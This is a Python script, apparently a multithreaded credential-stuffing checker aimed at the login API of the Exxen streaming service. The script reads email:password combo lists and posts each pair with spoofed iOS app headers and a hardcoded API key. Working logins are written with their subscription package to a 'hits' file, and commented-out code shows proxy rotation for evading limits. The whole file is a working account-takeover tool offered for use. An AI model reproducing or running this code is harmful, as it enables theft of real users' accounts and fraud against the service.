import requests
import threading
import time
import sys
import hashlib
import urllib.parse
deger2 = 0
def combo():

        combos = open(sys.argv[1], encoding='utf8', errors = 'ignore').readlines()
        User = []
        Pass = []
        for y in combos:
            ez = y.replace("\n", "").split(":")
            try:
                User.append(ez[0])
                Pass.append(ez[1])
            except:
                pass
        return User,Pass




def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""



def crack(User1,Pass1):
  try:
    data = 'Email='+ User1+'&Password='+Pass1+'&RememberMe=false&deviceId=u05ojixxLUqxiIzbmnr4tNi2gBGA2S5Ri8hSQNNGfn1tX24Tfg_3clKCu36_6fzLeZc4KQGD9Y3UxmlPkIjvGQ'
    url_post1 = "https://api-crm.exxen.com/membership/login/email?key=90d806464edeaa965b75a40a5c090764"
    headers = {
				"Host": "api-crm.exxen.com",
				"Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
				"Accept": "*/*",
				"Cache-Control": "no-cache",
				"Connection": "keep-alive",
				"Origin": "com.exxen.ios",
				"User-Agent": "Exxen/1.0.3 (com.exxen.ios; build:2; iOS 14.3.0) Alamofire/5.4.1",
				"Accept-Language": "tr-TR;q=1.0, ko-TR;q=0.9, en-TR;q=0.8",
				"Content-Length": "175",
				"Accept-Encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8"
}

    post = requests.post(url_post1,data=data,headers=headers)
    source = str(post.content)
    if 'RKLM' in source:
      Paket = find_between(source,',"PackageName":"','"')
      print("Work Account --->" + User1 + ":"+Pass1 + " | Paket = " + Paket)
      with open("hitss.txt", "a+") as f:
                f.write(f"Work Account --->" + User1 + ":"+Pass1 + " | Paket = " + Paket + "\n")
      if 'RKLM' not in source:
        print("fail")
  except Exception as e:
    pass

def başlatıcı():
    num=int('0')
    User,Pass=combo()
    threadsnum = sys.argv[2]
    while 1:
        if threading.active_count() < int(threadsnum):
                if len(User) > num:
     #                   randomproxy = proxys3[random.randint(1,len(proxys3))]
     #                   proxsel = {
     #                       'http': 'http://'+randomproxy,
     #                       'https': 'https://'+randomproxy
     #                       }
                    threading.Thread(target=crack, args=(User[num], Pass[num])).start()
                    num += 1
                    print("Taranmış User Sayısı "+ str(num))
                    #kalan -= 1
                else:
                    
                    exit()
                    time.sleep(0.6)
                    
        else:
            #print("Checking done!")
            time.sleep(0.3)
başlatıcı()